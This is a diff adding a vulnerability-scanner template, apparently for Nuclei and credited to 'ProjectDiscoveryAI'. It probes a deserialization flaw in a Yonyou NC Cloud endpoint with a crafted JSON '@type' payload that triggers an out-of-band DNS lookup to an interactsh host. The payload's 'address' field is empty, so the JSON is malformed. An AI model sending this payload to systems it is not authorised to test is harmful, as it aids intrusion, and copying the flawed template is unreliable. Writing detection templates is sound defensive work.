@@ -1,0 +1,34 @@
+id: yonyou-nc-cloud-blobrefclasssea-unserialize
+info:
+  name: Yonyou NC Cloud blobRefClassSea Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, file-upload
+  description: |
+    This template checks for a deserialization vulnerability in the Yonyou NC Cloud blobRefClassSea endpoint, which can be exploited using crafted payloads leading to potential data leakage or execution.
+
+dns:
+  - name: '{{interactsh-url}}'
+    type: A
+
+http:
+  - method: POST
+    path:
+      - "/ncchr/pm/ref/indiIssued/blobRefClassSearch"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "clientParam": "{\"x\":{\"@type\":\"java.net.InetSocketAddress\",\"address\":,\"val\":\"{{interactsh-url}}\"}}"
+      }
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: interactsh_request
+        words:
+          - "{{interactsh-url}}"
